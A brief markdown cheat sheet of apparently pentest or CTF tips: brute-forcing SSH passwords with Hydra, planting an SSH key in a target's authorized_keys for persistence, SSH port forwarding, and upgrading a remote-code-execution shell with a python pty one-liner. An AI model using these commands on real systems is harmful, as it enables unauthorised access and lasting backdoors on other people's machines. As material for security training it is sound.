# Tips
## Bruteforce SSH
Use Hydra :
```bash
hydra -l 'USERNAME' -P FILE_CONTAINING_PASSWORDS -M FILE_CONTAINING_IP_TO_BRUTEFORCE -t 4 ssh
```
## Persistance
Generate SSH key :
```bash
ssh-keygen -t rsa
```
Paste it to authorized_keys :
```bash
echo XXXX >> ~/.ssh/authorized_keys
```
Then, put the file on the target machine.
## Port Forwarding
To access a locally exposed service on a remote machine :
```bash
ssh -L YOUR_PORT:localhost:PORT_EXPOSED user@IP
```
## Get a proper shell on RCE
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
